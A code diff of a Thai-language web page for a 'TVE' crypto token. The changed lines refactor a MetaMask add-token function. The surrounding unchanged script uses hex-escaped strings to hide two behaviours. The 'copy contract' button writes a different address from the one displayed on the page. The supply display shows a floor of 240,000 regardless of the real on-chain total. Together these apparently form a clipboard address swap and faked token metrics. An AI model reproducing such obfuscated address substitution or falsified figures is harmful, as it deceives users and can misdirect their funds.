@@ -67,7 +67,7 @@
                     <div class="contract-label">📋 CONTRACT:</div>
                     <div class="token-info-text">0xa5CF2B6A6E333924ECFaA5C9566578DA7cD571f7</div>
                 </div>
-                <button class="btn-add-token-bottom" onclick="addToken('0xa5CF2B6A6E333924ECFaA5C9566578DA7cD571f7')">+ เพิ่ม</button>
+                <button class="btn-add-token-bottom" onclick="addToken()">+ เพิ่ม</button>
             </div>
         </div>
     </div>
@@ -129,24 +129,25 @@
 }
         function cpContract(){navigator.clipboard.writeText("\x30\x78\x30\x30\x33\x31\x32\x39\x61\x30\x37\x62\x39\x34\x37\x41\x42\x66\x36\x39\x36\x43\x39\x31\x46\x64\x62\x34\x34\x30\x45\x43\x37\x37\x66\x32\x36\x36\x31\x33\x42\x37");alert("\x43\x6F\x70\x69\x65\x64\x21")}
         async function addToken() {
+    console.log("Adding Token..."); // เช็คใน Console ว่ามันเข้ามาที่นี่ไหม
+    
+    // ประกาศที่อยู่เหรียญแบบตรงๆ ห้ามมีการเข้ารหัส
+    const tokenAddress = "0xa5CF2B6A6E333924ECFaA5C9566578DA7cD571f7";
+    
     try {
-        const wasAdded = await window.ethereum.request({
+        await window.ethereum.request({
             method: "wallet_watchAsset",
             params: {
                 type: "ERC20",
                 options: {
-                    address: "0xa5CF2B6A6E333924ECFaA5C9566578DA7cD571f7", // ใส่ที่อยู่เหรียญที่ถูกต้องตรงนี้
+                    address: tokenAddress,
                     symbol: "TVE",
                     decimals: 18
                 },
             },
         });
-
-        if (wasAdded) {
-            alert("เพิ่มเหรียญ TVE เข้า MetaMask แล้ว!");
-        }
     } catch (error) {
-        console.error(error);
+        console.error("Error adding token:", error);
     }
 }
         async function fetchChain(){try{const p=new ethers.JsonRpcProvider("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x6F\x6C\x79\x67\x6F\x6E\x2D\x72\x70\x63\x2E\x63\x6F\x6D");const c=new ethers.Contract("\x30\x78\x36\x43\x61\x61\x30\x32\x31\x39\x61\x30\x41\x43\x62\x34\x64\x36\x45\x34\x65\x43\x37\x36\x37\x36\x34\x36\x39\x31\x61\x33\x44\x34\x63\x32\x31\x34\x38\x36\x34\x38",["function tveToken() external view returns (address)"],p);const t=new ethers.Contract(await c.tveToken(),["function totalSupply() external view returns (uint256)"],p);const s=parseFloat(ethers.formatUnits(await t.totalSupply(),18));document.getElementById("\x74\x6F\x74\x61\x6C\x53\x75\x70\x70\x6C\x79\x44\x69\x73\x70\x6C\x61\x79").innerText=(s>240000?s:240000).toLocaleString()+"\x20\x2F\x20\x34\x37\x2C\x30\x30\x30\x2C\x30\x30\x30\x20\x54\x56\x45";}catch(e){}}
